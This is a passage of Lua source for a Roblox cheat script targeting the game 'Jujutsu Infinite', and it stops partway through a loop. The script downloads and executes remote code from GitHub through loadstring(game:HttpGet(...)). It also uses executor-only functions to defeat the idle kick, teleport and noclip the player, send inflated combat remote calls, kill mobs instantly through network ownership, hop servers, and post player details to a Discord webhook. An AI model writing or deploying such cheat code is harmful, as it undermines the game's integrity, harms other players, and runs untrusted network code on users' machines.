repeat wait() until game:IsLoaded()

if game.PlaceId == 118693886221846 then
	IsTutorial = true
elseif game.PlaceId == 10450270085 then
	IsWorld = true
elseif game.PlaceId == 16379688837 then
	IsBoss = true
elseif game.PlaceId == 16379684339 then
	IsInvestigation = true
elseif game.PlaceId == 77485548999573 then
	IsExchangeEvent = true
elseif game.PlaceId == 16379657109 then
	IsAfk = true
elseif game.PlaceId == 119359147980471 then
	IsLobbyBoss = true
elseif game.PlaceId == 78904562518018 then
	IsLobbyInvestigation = true
elseif game.PlaceId == 100730147537810 or game.PlaceId == 90925658700602 then
	IsLobbyCalamity = true
end

if not LPH_OBFUSCATED then
	LPH_JIT_MAX = function(...) return (...) end
	LPH_NO_VIRTUALIZE = function(...) return (...) end
	LPH_NO_UPVALUES = function(...) return (...) end
	LPH_CRASH = function(...) return ... end
else
	print = function() end
	warn = function() end
end

if not Tasks then
	getgenv().Tasks = {}
end

if not Connections then
	getgenv().Connections = {}
end

if Connections then
	for i,v in next, Connections do
		v:Disconnect()
		Connections[v] = nil
	end
end

if Tasks then
	for i,v in next, Tasks do
		task.cancel(v)
		Tasks[v] = nil
	end
end

local function InsertTasks(Task)
	table.insert(Tasks, Task)
end

local function InsertConnections(Connection)
	table.insert(Connections, Connection)
end

local CoreGui             = cloneref(game:GetService("CoreGui"))
local Debris              = cloneref(game:GetService("Debris"))
local GuiService          = cloneref(game:GetService("GuiService"))
local HttpService         = cloneref(game:GetService("HttpService"))
local Lighting            = cloneref(game:GetService("Lighting"))
local LocalizationService = cloneref(game:GetService("LocalizationService"))
local Players             = cloneref(game:GetService("Players"))
local ReplicatedFirst     = cloneref(game:GetService("ReplicatedFirst"))
local ReplicatedStorage   = cloneref(game:GetService("ReplicatedStorage"))
local RunService          = cloneref(game:GetService("RunService"))
local TeleportService     = cloneref(game:GetService("TeleportService"))
local TextChatService     = cloneref(game:GetService("TextChatService"))
local TweenService        = cloneref(game:GetService("TweenService"))
local UserInputService    = cloneref(game:GetService("UserInputService"))
local VirtualInputManager = cloneref(game:GetService("VirtualInputManager"))
local VirtualUser         = cloneref(game:GetService("VirtualUser"))
local Workspace           = cloneref(game:GetService("Workspace"))
local Camera              = Workspace.CurrentCamera

local wait = task.wait
local spawn = task.spawn
local plr = Players.LocalPlayer
local PlayerGUI = plr:FindFirstChildWhichIsA("PlayerGui")

repeat wait(0.3) until plr and (PlayerGUI:FindFirstChild("ANGIntro") and not PlayerGUI.ANGIntro.Enabled) and (PlayerGUI:FindFirstChild("Loading") and not PlayerGUI.Loading.Enabled) and (PlayerGUI:FindFirstChild("GamemodeWait") and not PlayerGUI.GamemodeWait.Enabled)

local webhookUtil = loadstring(game:HttpGet("https://raw.githubusercontent.com/meobeo8/Misc/a/Webhook.lua"))()
local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/Ifykyklolololol/SolixCore/refs/heads/main/shhhV2"))()

local char = plr.Character or plr.CharacterAdded:Wait()

InsertConnections(plr.CharacterAdded:Connect(function(v)
	v:WaitForChild("HumanoidRootPart", 5)
	v:WaitForChild("Humanoid", 5)
	char = v
end))

if getconnections then
	local connections = getconnections(plr.Idled)

	for _, v in pairs(connections) do
		if v.Disable then
			v:Disable()
		elseif v.Disconnect then
			v:Disconnect()
		end
	end
end

InsertConnections(plr.Idled:Connect(function()
	VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Return, false, game)
	wait(0.01)
	VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.Return, false, game)
end))

local function FindPath(v, ...)
	for _, n in ipairs({...}) do
		if not v then return nil end
		v = v:FindFirstChild(n)
	end
	return v
end

local function WaitPath(v, ...)
	for _, n in ipairs({...}) do
		if not v then return nil end
		v = v:WaitForChild(n)
	end
	return v
end

local function IsActive(v)
	return v
		and v.Parent
		and v:FindFirstChild("HumanoidRootPart")
		and v:FindFirstChildOfClass("Humanoid")
		and v:FindFirstChildOfClass("Humanoid").Health > 0
end

local function IsObject(v)
	return v
		and v.Parent
		and v:FindFirstChildWhichIsA("BasePart")
		and v:FindFirstChildOfClass("ProximityPrompt")
end

local function IsMaterial(v)
	return v 
		and v.Parent
		and ((v:FindFirstChildWhichIsA("BasePart")
			and v:FindFirstChildWhichIsA("BasePart"):FindFirstChildOfClass("ProximityPrompt"))
			or
			(v:FindFirstChildOfClass("Model")
				and v:FindFirstChildOfClass("Model"):FindFirstChildWhichIsA("BasePart")
				and v:FindFirstChildOfClass("Model"):FindFirstChildWhichIsA("BasePart"):FindFirstChildOfClass("ProximityPrompt")))
end

local function IsDaily(target)
	local v = Workspace.Objects.NPCs[target].UI.HealthName

	return v
		and v.Parent 
		and v.Parent.Enabled 
		and v.Text == "Daily Quest" 
		and v.TextColor3 == Color3.fromRGB(26, 186, 255)
end

local function IsStun()
	local v = char.Humanoid.CombatAgent.Statuses

	return ReplicatedStorage.WorldStatuses:FindFirstChild("WorldStunned") or v:FindFirstChild("TrueStun") or (not v:FindFirstChild("NoStun") and (v:FindFirstChild("Slowed") or v:FindFirstChild("BlockSlowed") or (v:FindFirstChild("Stunned") or v:FindFirstChild("Ragdolled"))))
end
local function IsChargeMeter()
	for _, v in ipairs(Workspace.Objects.Locations.Spears:GetChildren()) do
		local c = v.Particles.ChargeMeter

		if c 
			and c.Enabled 
			and c.Size.X.Scale ~= 50 then
			return v
		end
	end
end

local function IsEnery(v)
	return v 
		and v.Parent 
		and v.BillboardGui.Enabled
end

local function IsCrystal(v)
	return v 
		and v.Parent
		or not v:FindFirstChild("RootPart")
end

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

local type8 = {
	Client = ReplicatedStorage.Remotes.Client,
	Server = ReplicatedStorage.Remotes.Server,
	Skill = ReplicatedStorage.Remotes.Server.Combat.Skill,

	Cards = PlayerGUI.Missions.Frame.Main.Cards,
	Codes = PlayerGUI.Customization.Frame.BottomRight.Codes,
	SkillBars = PlayerGUI.Main.Frame.BottomRight.SkillBars,
	Skip = PlayerGUI.StorylineDialogue.Frame.Dialogue.Skip,

	MissionData = {
		{ "Shijo Town Set", 1, 61},
		{ "Umi Village Set", 60, 121},
		{ "Numa Temple Set", 120, 181},
		{ "Kura Camp Set", 180, 241},
		{ "Yuki Fortress Set", 240, math.huge}
	},

	StoryData = {
		["Beginner Quest (Lvl. 1+)"] = {"Clan Head Town1", "Clan Head", "Accept/NS_Q1_BanditOutpost_Start"},
		["Investigate Quest (Lvl. 30+)"] = {"Clan Head Town1", "Clan Head", "Accept/NS_Q2_RogueAmbush_Start"},
		["Cursed School Quest (Lvl. 60+)"] = {"Storyline", "Storyline", "Accept/NS_Q3_SchoolInvestigation_Start"},
		["Finger Bearer Boss (Lvl. 60+)"] = {"Clan Head Town1", "Clan Head", "Accept/NS_Q4_FingerBearer_Start"},
		["Umi Village (Lvl. 60+)"] = {"Clan Head Town1", "Clan Head", "Continue/NS_Next_Town_03a"},
		["Whirlpool Quest (Lvl. 90+)"] = {"Clan Head Town2", "Clan Head", "Accept/G4_Q2_Tsunami_Start"},
		["Ocean Curse Boss (Lvl. 120+)"] = {"Storyline", "Storyline", "Accept/G4_Q3_Dagon_Start"},
		["Yasohachi Bridge (Lvl. 120+)"] = {"Clan Head Town2", "Clan Head", "Accept/G4_Q4_Bridge_Start"},
		["Numa Temple (Lvl. 120+)"] = {"Clan Head Town2", "Clan Head", "Continue/G4_Next_Town_03a"},
		["Strange Occurings (Lvl. 150+)"] = {"Clan Head Town3", "Clan Head", "Accept/G3_Q2_Transfigured_Start"},
		["Soul Curse Boss (Lvl. 180+)"] = {"Clan Head Town3", "Clan Head", "Accept/G3_Q3_Mahito_Start"},
		["Tokyo Subway (Lvl. 180+)"] = {"Clan Head Town3", "Clan Head", "Accept/G3_Q4_Subway_Start"},
		["Kura Camp (Lvl. 180+)"] = {"Clan Head Town3", "Clan Head", "Continue/G3_Next_Town_03a"},
		["Mist Quest (Lvl. 210+)"] = {"Clan Head Town4", "Clan Head", "Accept/G2_Q2_MistClear_Start"},
		["Volcano Anomaly (Lvl. 240+)"] = {"Clan Head Town4", "Clan Head", "Continue/G2_Q3_Volcano_Start"},
		["Volcano Curse Boss (Lvl. 240+)"] = {"Clan Head Town4", "Clan Head", "Accept/G2_Q4_VolcanoBoss_Start"},
		["Eerie Farm (Lvl. 240+)"] = {"Clan Head Town4", "Clan Head", "Accept/G2_Q5_EerieFarm_Start"},
		["Yuki Fortress (Lvl. 240+)"] = {"Clan Head Town4", "Clan Head", "Continue/G2_Next_Town_05a"},
		["Rotten Anomaly (Lvl. 270+)"] = {"Clan Head Town5", "Clan Head", "Accept/G1_Q2_RotAnomaly_Start"},
		["Sorcerer Killer (Lvl. 300+)"] = {"Clan Head Town5", "Clan Head", "Accept/G1_Q3_SorcererKiller"},
		["Cursed Prison (Lvl. 300+)"] = {"Clan Head Town5", "Clan Head", "Accept/G1_Q4_CursedPrison_Start"},
		["Special Grade (Lvl. 300+)"] = {"Clan Head Town5", "Clan Head", "Continue/G1_Next_Town_05"},
		["Maximum Technique (Lvl. 360+)"] = {"Clan Head Town5", "Clan Head", "Accept/SG_Q1_Maximum"},
		["Imaginary Demon (Lvl. 420+)"] = {"Clan Head Town5", "Clan Head", "Accept/SG_Q2_Domain"},
		["The Spear from Heaven (Lvl. 435+)"] = {"Storyline", "Storyline", "Accept/SG_Q3_SpearFromHeaven"},
		["Rift Invasion (Lvl. 450+)"] = {"Storyline", "Storyline", "Accept/SG_Q4_RiftInvasion"},
		["Confrontation (Lvl. 465+)"] = {"Storyline", "Storyline", "Summon Entity"}
	},

	DailyData = {
		["Lazy Sorcerer"] = 0,
		["Curse Slayer"] = 0,
		["Cabbage Merchant"] = 70,
		["Grave Digger"] = 140,
		["Temple Master"] = 150,
		["Camp Sorcerer"] = 200,
		["Mr. Snow"] = 240,
		["Fort Alchemist"] = 250,
	},

	InnateData = {
		["Tool Manipulation"] = "Common",
		["Construction"] = "Common",
		["Cloning Technique"] = "Common",
		["Boogie Woogie"] = "Uncommon",
		["Blazing Courage"] = "Uncommon",
		["Ratio"] = "Rare",
		["Cursed Speech"] = "Rare",
		["Blood Manipulation"] = "Rare",
		["Straw Doll"] = "Rare",
		["Cryokinesis"] = "Rare",
		["Volcano"] = "Legendary",
		["Hydrokinesis"] = "Legendary",
		["Judgeman"] = "Legendary",
		["Puppet"] = "Legendary",
		["Projection"] = "Legendary",
		["Plant Manipulation"] = "Legendary",
		["Thunder God"] = "Special Grade",
		["Ancient Construction"] = "Special Grade",
		["Star Rage"] = "Special Grade",
		["Gambler Fever"] = "Special Grade",
		["Soul King"] = "Special Grade",
		["Soul Manipulation"] = "Special Grade",
		["Curse Queen"] = "Special Grade",
		["Demon Vessel"] = "Special Grade",
		["Infinity"] = "Special Grade"
	},

	GradeData = {
		{"Non Sorcerer", 0, 0, 0},
		{"Grade 4", 60, 5000, 25},
		{"Grade 3", 120, 50000, 50},
		{"Grade 2", 180, 100000, 100},
		{"Grade 1", 240, 250000, 150},
		{"Special Grade", 300, 500000, 200}
	},

	ItemData = {
		["Talisman"] = "Rare",
		["Demon Finger"] = "Legendary",
		["Inverted Spear Of Heaven"] = "Legendary",
		["Purified Curse Hand"] = "Special Grade",
		["Vengeance"] = "Special Grade",
		["Domain Shard"] = "Unique",
		["Maximum Scroll"] = "Unique"
	},

	MaterialData = {
		["Cursebloom"] = "Common",
		["Spring Puff"] = "Common",
		["Frost Petal"] = "Common"
	},

	VialData = {
		["Damage Vial"]  = "Common",
		["Focus Vial"]   = "Common",
		["Agility Vial"] = "Common",
		["Luck Vial"]    = "Common",
		["Health Vial"]  = "Common"
	},

	GourdData = {
		["Fortune Gourd"] = "Legendary",
		["Rage Gourd"] = "Rare",
		["Damage Gourd"] = "Uncommon",
		["Focus Gourd"] = "Uncommon"
	},

	CatData = {
		["Golden Beckoning Cat"] = "Special Grade",
		["Polished Beckoning Cat"] = "Legendary",
		["Wooden Beckoning Cat"] = "Rare",
		["Withered Beckoning Cat"] = "Uncommon"
	},

	ConsumableData = {
		["Iridescent Lotus"] = "Unobtainable",
		["Jade Lotus"] = "Special Grade",
		["Sapphire Lotus"] = "Legendary",
		["White Lotus"] = "Rare",
		["Takoyaki"] = "Common",
		["Dorayaki"] = "Common"
	},

	CalamityData = {
		["Calamity Fortune Gourd"] = "Legendary",
		["Polished Calamity Eyeball"] = "Legendary",
		["Calamity Ward"] = "Rare",
		["Withered Calamity Eyeball"] = "Uncommon",
		["Calamity Luck Vial"] = "Common"
	},

	RarityData = {
		["Common"] = 1,
		["Uncommon"] = 2,
		["Rare"] = 3,
		["Legendary"] = 4,
		["Special Grade"] = 5,
		["Unique"] = 6,
		["Unobtainable"] = 7
	},

	ModeData = {
		Boss = 119359147980471,
		Investigation = 78904562518018,
		Calamity = 90925658700602
	},

	SettingData = {
		["Instant Teleport"] = false,
		["Show Max Item Warning"] = false,
		["Skip Calamity Intro"] = true,
		["Skip Chest Animation"] = true
	},

	ModeList = {
		"Boss",
		"Investigation",
		"Calamity"
	},
	MapList = {
		"Finger Bearer",
		"Ocean Curse",
		"Soul Curse",
		"Volcano Curse",
		"Sorcerer Killer",
		"Heian Imaginary Demon",
		"Cursed School",
		"Yasohachi Bridge",
		"Tokyo Subway",
		"Eerie Farm",
		"Detention Center",
		"Six Eyed Calamity"
	},
	DifficultyList = {
		"Easy",
		"Medium",
		"Hard", 
		"Nightmare"
	},
	LevelList = {
		"1", 
		"2",
		"3",
		"4"
	},

	WorldList = {
		"Egg Jaw",
		"Krampus",
		"Mantis Curse",
		"Monk of The Lake"
	},
	WorldSelect = {},

	DailyList = {},
	DailyDisplay = {},
	DailySelect = {},

	InnateList = {},
	InnateDisplay = {},
	InnateSelect = {},

	ItemList = {},
	ItemDisplay = {},
	ItemSelect = {},

	MaterialList = {},
	MaterialDisplay = {},
	MaterialSelect = {},

	CashMarketList = {
		"+1 Spin",
		"Cursed Fragment",
		"Cursed Tentacle",
		"Demon Blob",
		"Demon Finger",
		"Finger Bearer Chest",
		"Fortune Gourd",
		"Golden Beckoning Cat",
		"Heavenly Chains",
		"Jade Lotus",
		"Polished Beckoning Cat",
		"Sapphire Lotus",
		"Sorcerer Killer Chest"
	},
	CashMarketSelect = {},

	InventoryList = {},
	InventoryDisplay = {},
	InventorySelect = {},

	VialList = {},
	VialDisplay = {},
	VialSelect = {},

	GourdList = {},
	GourdDisplay = {},
	GourdSelect = {},

	CatList = {},
	CatDisplay = {},
	CatSelect = {},

	ConsumableList = {},
	ConsumableDisplay = {},
	ConsumableSelect = {},

	CalamityList = {},
	CalamityDisplay = {},
	CalamitySelect = {},

	TownList = {},

	PortalList = {},

	NPCList = {},

	EmoteList = {},

	SkillData = {
		"Z",
		"X",
		"C",
		"V",
		"B", 
		"G",
		"T",
		"Y"
	},
	SkillList = {},
	SkillSelect = {},

	RewardList = {},

	CooldownList = {},

	CodeList = {},

	GoonList = {},

	FlyList = {},

	BlackScreen = nil
}

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

local function AddCooldown(v, c)
	type8.CooldownList[v] = c and (tick() + c) or math.huge
end

local function HasCooldown(v)
	local c = type8.CooldownList[v]

	if c and tick() >= c then
		type8.CooldownList[v] = nil
		return false
	end

	return c ~= nil
end

local function RemoveCooldown(v)
	type8.CooldownList[v] = nil
end

local function ToTime(s)
	if s < 0 then
		return "I don't know either"
	end

	s = math.floor(s)
	local days = math.floor(s / 86400)
	s = s % 86400
	local hours = math.floor(s / 3600)
	s = s % 3600
	local minutes = math.floor(s / 60)
	local secs = s % 60

	if days > 0 then
		return string.format("%dd %02dh %02dm %02ds", days, hours, minutes, secs)
	else
		return string.format("%02dh %02dm %02ds", hours, minutes, secs)
	end
end

local function NormalizeName(v)
	v = string.lower(v)
	v = v:gsub("%s+", "")
	v = v:gsub("%d", "")
	return v
end

local function TP(v)
	if not v or not IsActive(char) then return end
	char.HumanoidRootPart.CFrame = v
end

local function Walk(v)
	if not v or not IsActive(char) then return end
	char.Humanoid:MoveTo(v)

	repeat wait(0.1)
		if (char.HumanoidRootPart.Position - v).Magnitude < 5 then return end
	until not IsActive(char)
end

local function Anchor(value)
	if not IsActive(char) then return end

	local a = char.HumanoidRootPart:FindFirstChild("a")

	if value then
		if not a then
			char.Humanoid.PlatformStand = true
			local a = Instance.new("BodyVelocity")
			a.Name = "a"
			a.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
			a.Velocity = Vector3.new(0, 0, 0)
			a.Parent = char.HumanoidRootPart
		end
	else
		task.delay(0.3, function()
			if a then
				char.Humanoid.PlatformStand = false
				a:Destroy()
			end	
		end)
	end
end

local function Noclip(val)
	if not IsActive(char) then return end

	for _, v in pairs(char:GetDescendants()) do
		if v:IsA("BasePart") then
			v.CanCollide = not val
		end
	end
end

function type8.M1(v)
	if IsStun() or HasCooldown("M1") then return end
	AddCooldown("M1", 1)

	task.delay(0.1, function()
		type8.Server.Combat.M1:FireServer(math.random(1, 5), {v})
	end)
end

function type8.M2(v)
	if IsStun() or HasCooldown("M2") then return end
	AddCooldown("M2", 1)

	task.delay(0.1, function()
		type8.Server.Combat.ApplyBlackFlashToNextHitbox:FireServer(9e9)
		wait(0.03)
		type8.Server.Combat.M2:FireServer(v)
	end)
end

function type8.UseSkill()
	if IsStun() or not Library.Flags["Auto Use Skill"] then return end

	if Library.Flags["Select Skill Method"] == "Custom" then
		for _, v in ipairs(type8.SkillSelect) do
			if not HasCooldown(v) then
				AddCooldown(v, 6)
				type8.Skill:FireServer(v)
				break
			end
		end

	elseif Library.Flags["Select Skill Method"] == "Random" then
		for _, v in ipairs(ReplicatedStorage.Skills:GetChildren()) do
			if v:FindFirstChild("Innate")
				and v.Innate.Value ~= "None" 
				and not HasCooldown(v.Name) then
				AddCooldown(v.Name, 6)
				type8.Skill:FireServer(v.Name)
				break
			end
		end
	end
end

local function Block()
	if IsStun() or HasCooldown("Block") then return end
	AddCooldown("Block", 0.1)

	if not char.Humanoid.CombatAgent.Blocking.Value then
		type8.Server.Combat.Block:FireServer(true)
	end
end

local function InstantKill(r, h)
	type8.Server.Combat.ToggleMenu:FireServer(false)
	wait(0.3)
	if not (isnetworkowner and isnetworkowner(r)) then return end
	if (char.HumanoidRootPart.Position - r.Position).Magnitude >= 300 then return end

	task.delay(0.3, function()
		h.Health = 0
	end)
end

local function GetMob(target, distance)
	local mob, distance, range = nil, math.huge, distance or math.huge
	local team = IsExchangeEvent and char.Humanoid.CombatAgent.Statuses:FindFirstChild("Tokyo") and "Tokyo" or "Kyoto"

	for _, v in ipairs(Workspace.Objects.Mobs:GetChildren()) do
		if IsActive(v) then
			local valid = false
			if target == nil then
				valid = true
			elseif typeof(target) == "string" then
				valid = NormalizeName(v.Name) == NormalizeName(target)
			elseif typeof(target) == "table" then
				for _, t in ipairs(target) do
					if NormalizeName(v.Name) == NormalizeName(t) then
						valid = true
						break
					end
				end
			end

			if valid then
				if IsExchangeEvent then
					local status = v.Humanoid.CombatAgent.Statuses
					if status:FindFirstChild("Tokyo") and "Tokyo" or status:FindFirstChild("Kyoto") and "Kyoto" or nil == team then valid = false end
				end

				if valid then
					local dist = (v.HumanoidRootPart.Position - char.HumanoidRootPart.Position).Magnitude
					if dist and dist <= range and dist < distance then
						mob = v
						distance = dist
					end
				end
			end
		end
	end
	return mob
end

local function GetMission()
	local l = plr.ReplicatedData.level.Value or 1

	for _, v in ipairs(type8.MissionData) do
		if l >= v[2] and l < v[3] then
			return v[1]
		end
	end
end

local function GetQuestMaker()
	local v = FindPath(PlayerGUI, "QuestMarker", "Frame")

	if v 
		and v.Parent 
		and v.Parent.Adornee
		and v.Parent.Adornee.Parent then
		return v.Parent.Adornee.Parent
	end

	for _, v in ipairs(Workspace.Objects.Mobs:GetChildren()) do
		if IsActive(v) 
			and v.HumanoidRootPart:FindFirstChild("QuestMarker") then
			return v 
		end 
	end
end

local function GetQuestName()
	local v = FindPath(plr.ReplicatedTempData, "quest", "questName")

	if v then 
		return v.Value 
	end
end

local function GetResponse()
	local v = PlayerGUI:FindFirstChild("StorylineDialogue")

	if v and v.Enabled then
		return v.Frame.Dialogue.Response.Text
	end
end

local function GetChest()
	for _, v in ipairs(Workspace.Objects.Drops:GetDescendants()) do
		if v:IsA("Model")
			and v.Name == "Chest"
			and v:FindFirstChild("Meshes/box")
			and v["Meshes/box"].Transparency == 0
			and v:FindFirstChildOfClass("ProximityPrompt") then
			if v:FindFirstChild("PlayerOwned") and v.PlayerOwned.Value == plr then
				return v:FindFirstChildOfClass("ProximityPrompt")
			end
		end
	end
end

local function SendTrue(v)
	VirtualInputManager:SendKeyEvent(true, v, false, game)
end

local function SendFalse(v)
	VirtualInputManager:SendKeyEvent(false, v, false, game)
end

local function SendKey(v)
	SendTrue(v)
	wait(0.01)
	SendFalse(v)
end

local function Fire(s)
	for i, v in next, getconnections(s.MouseButton1Click) do
		v.Function()
	end
end

local function ClickGui(v)
	if not v or not v:IsA("GuiObject") then return end

	local success = false
	for i = 1, 10 do
		if v.Visible 
			and v.Parent 
			and v.Parent:IsDescendantOf(PlayerGUI) then
			local ok = pcall(function()
				GuiService.SelectedObject = v
			end)
			if ok 
				and GuiService.SelectedObject == v then
				success = true
				break
			end
		end
	end

	if success then
		SendKey(Enum.KeyCode.Return)		
		wait(0.01)
		GuiService.SelectedObject = nil
	end
end

local function ProximityPrompt(v)
	if v:IsA("ProximityPrompt") and v.Enabled then
		v.HoldDuration = 0
		fireproximityprompt(v)
	end
end

local function CheckTool(v)
	if type(v) == "string" then
		return plr.Backpack:FindFirstChild(v) or char:FindFirstChild(v)
	elseif type(v) == "table" then
		for _, v in ipairs(v) do
			local t = plr.Backpack:FindFirstChild(v) or char:FindFirstChild(v)

			if t then
				return t
			end
		end
	end
	return nil
end

local function EquipTool(v)
	local v = plr.Backpack:FindFirstChild(v)

	if v then
		char.Humanoid:EquipTool(v)
	end
end

local function CreatePart(v)
	if v:FindFirstChild("Part") then
		return v:FindFirstChild("Part")
	end

	local p = Instance.new("Part")
	p.Name = "Part"
	p.Size = Vector3.new(30, 3, 30)
	p.Anchored = true
	p.CanCollide = true
	p.Transparency = 0
	p.CFrame = v.CFrame * CFrame.new(0, 30, 0)
	p.Parent = v

	return p
end

local function SendWebhook(url, mention, title, description)
	local webhook_info = webhookUtil.createMessage({
		Url = url,
		username = "solixhub",
		content = mention
	})

	local embed = webhook_info.addEmbed("Jujutsu Infinite", math.random(0, 16777215), "")
	embed.addField("Name", "||" .. plr.Name .. " [" .. plr.ReplicatedData.level.Value .. "]||")
	embed.addField(title, description)

	pcall(function()
		webhook_info.sendMessage()
	end)
end

local function OptimizeObject(obj)
	if not obj or not obj.Parent then return end

	if obj:IsA("BasePart") or obj:IsA("MeshPart") then
		obj.Reflectance = 0
		obj.CastShadow = false
		obj.Material = Enum.Material.SmoothPlastic
		obj.TopSurface = Enum.SurfaceType.Studs
		obj.BottomSurface = Enum.SurfaceType.Studs
		obj.LeftSurface = Enum.SurfaceType.Studs
		obj.RightSurface = Enum.SurfaceType.Studs
		obj.FrontSurface = Enum.SurfaceType.Studs
		obj.BackSurface = Enum.SurfaceType.Studs

		if obj:IsA("MeshPart") then
			obj.TextureID = ""
		end

	elseif obj:IsA("Decal") or obj:IsA("Texture") then
		obj.Transparency = 1

	elseif obj:IsA("Sky") then
		obj.Parent = nil

	elseif obj:IsA("ParticleEmitter") 
		or obj:IsA("Smoke") 
		or obj:IsA("Fire") 
		or obj:IsA("Sparkles") 
		or obj:IsA("Beam") 
		or obj:IsA("Trail") then
		obj.Enabled = false

	elseif obj:IsA("Explosion") then
		obj.Parent = nil

	elseif obj:IsA("SurfaceGui") or obj:IsA("BillboardGui") then
		obj.Enabled = false

	elseif obj:IsA("PointLight") or obj:IsA("SpotLight") or obj:IsA("SurfaceLight") then
		obj.Enabled = false
		obj.Brightness = 0
		obj.Range = 0

	elseif obj:IsA("Highlight") 
		or obj:IsA("SelectionBox") 
		or obj:IsA("SelectionSphere") then
		obj.Enabled = false

	elseif obj:IsA("BloomEffect") 
		or obj:IsA("BlurEffect") 
		or obj:IsA("ColorCorrectionEffect")
		or obj:IsA("SunRaysEffect") 
		or obj:IsA("DepthOfFieldEffect") then
		obj.Enabled = false

	elseif obj:IsA("Atmosphere") then
		obj.Density = 0
		obj.Haze = 0
		obj.Glare = 0

	elseif obj:IsA("Sound") then
		obj.Volume = 0
		obj.Playing = false

	elseif obj:IsA("Terrain") then
		obj.WaterWaveSize = 0
		obj.WaterWaveSpeed = 0
		obj.WaterReflectance = 0
		obj.WaterTransparency = 1

	elseif obj:IsA("PostEffect") then
		obj.Enabled = false
	end
end

local function Hop(method)
	if Library.Flags["Auto Farm World"] then wait(9) end

	repeat wait(0.3) until GetChest() == nil and not PlayerGUI.Loot.Enabled

	if not game.JobId or not game.PlaceId then
		Library:Notification({
			Name = "Hop Server",
			Description = "Cannot get server info",
			Duration = 10
		})
		return
	end

	local httprequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
	if not httprequest then
		Library:Notification({
			Name = "Hop Server",
			Description = "HTTP not supported",
			Duration = 10
		})
		return
	end

	local success, response = pcall(function()
		return httprequest({
			Url = string.format(
				"https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=Desc&limit=100&excludeFullGames=true",
				game.PlaceId
			)
		})
	end)

	if not success or not response or not response.Body then
		Library:Notification({
			Name = "Hop Server",
			Description = "Failed to fetch servers",
			Duration = 10
		})
		return
	end

	local decoded = HttpService:JSONDecode(response.Body)
	if not decoded or not decoded.data then
		Library:Notification({
			Name = "Hop Server",
			Description = "No server data found",
			Duration = 10
		})
		return
	end

	if method == "Low Population" then
		local all_id = {}
		local found_anything = ""
		local actual_hour = os.date("!*t").hour

		local function LowPlayers()
			local site_server
			if found_anything == "" then
				site_server = HttpService:JSONDecode(
					game:HttpGet(
						"https://games.roblox.com/v1/games/" ..
							game.PlaceId ..
							"/servers/Public?sortOrder=Asc&limit=100"
					)
				)
			else
				site_server = HttpService:JSONDecode(
					game:HttpGet(
						"https://games.roblox.com/v1/games/" ..
							game.PlaceId ..
							"/servers/Public?sortOrder=Asc&limit=100&cursor=" ..
							found_anything
					)
				)
			end

			if site_server.nextPageCursor and site_server.nextPageCursor ~= "null" then
				found_anything = site_server.nextPageCursor
			end

			for _, v in pairs(site_server.data) do
				local possible_server = true
				local id_server = tostring(v.id)

				if tonumber(v.maxPlayers) > tonumber(v.playing) then
					for num, existing in pairs(all_id) do
						if num ~= 0 and id_server == tostring(existing) then
							possible_server = false
						elseif num == 0 and tonumber(actual_hour) ~= tonumber(existing) then
							all_id = {}
							table.insert(all_id, actual_hour)
						end
					end

					if possible_server then
						table.insert(all_id, id_server)
						Library:Notification({
							Name = "Hop Server",
							Description = "Found low population server: " .. v.playing .. "/" .. v.maxPlayers,
							Duration = 3
						})
						wait()
						pcall(function()
							TeleportService:TeleportToPlaceInstance(game.PlaceId, id_server, plr)
						end)
						wait(4)
					end
				end
			end
		end

		while wait() do
			pcall(function()
				LowPlayers()
				if found_anything ~= "" then
					LowPlayers()
				end
			end)
		end
	else
		local servers = {}
		for _, server in ipairs(decoded.data) do
			if tonumber(server.playing) < tonumber(server.maxPlayers)
				and server.id ~= game.JobId then
				table.insert(servers, server)
			end
		end

		if #servers > 0 then
			local random_server = servers[math.random(1, #servers)]
			Library:Notification({
				Name = "Hop Server",
				Description = "Found normal population server: " ..
					random_server.playing .. "/" .. random_server.maxPlayers,
				Duration = 3
			})
			wait(1)
			pcall(function()
				TeleportService:TeleportToPlaceInstance(game.PlaceId, random_server.id, plr)
			end)
		else
			Library:Notification({
				Name = "Hop Server",
				Description = "No suitable servers found",
				Duration = 10
			})
		end
	end
end

local function http_get(url)
	local backends = {
		function(u)
			if syn and syn.request then
				local r = syn.request({Url = u, Method = "GET"})
				return r and r.Body
			end
		end,
		function(u)
			if http_request then
				local r = http_request({Url = u, Method = "GET"})
				return r and (r.Body or r.body)
			end
		end,
		function(u)
			if request then
				local r = request({Url = u, Method = "GET"})
				return r and (r.Body or r.body)
			end
		end,
		function(u)
			if http and http.request then
				local r = http.request("GET", u)
				return r and r.body
			end
		end,
		function(u)
			local ok, HttpService = pcall(function() return HttpService end)
			if ok and HttpService and HttpService.HttpEnabled then
				return HttpService:GetAsync(u)
			end
		end,
	}
	for _, fn in ipairs(backends) do
		local ok, res = pcall(fn, url)
		if ok and res and type(res) == "string" and #res > 0 then
			return true, res
		end
	end
	return false, nil
end

repeat wait(0.3) until Library and Library.Flags

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

local skills = FindPath(ReplicatedStorage, "Skills")
local emotes = FindPath(ReplicatedStorage, "ClientAnimations", "Emotes")
local towns = FindPath(Workspace, "Objects", "Locations", "Towns")
local portals = FindPath(Workspace, "Objects", "Portals")
local npcs = FindPath(Workspace, "Objects", "NPCs") 

local spears = FindPath(Workspace, "Objects", "Locations", "Spears")

if skills then
	for _, skill in ipairs(skills:GetChildren()) do
		table.insert(type8.SkillList, skill.Name)
	end
	table.sort(type8.SkillList)
end

if emotes then
	for _, emote in ipairs(emotes:GetChildren()) do
		if emote:IsA("Animation") then
			table.insert(type8.EmoteList, emote.Name)
		end
	end
	table.sort(type8.EmoteList)
end

if towns then
	for _, town in ipairs(towns:GetChildren()) do
		if town:IsA("BasePart") then
			table.insert(type8.TownList, town.Name)
		end
	end
	table.sort(type8.TownList)
end

if portals then
	for _, portal in ipairs(portals:GetChildren()) do
		if portal:IsA("BasePart") then
			table.insert(type8.PortalList, portal.Name)
		end
	end
	table.sort(type8.PortalList)
end

if npcs then
	for _, npc in ipairs(npcs:GetChildren()) do
		if npc:IsA("Model") then
			table.insert(type8.NPCList, npc.Name)
		end
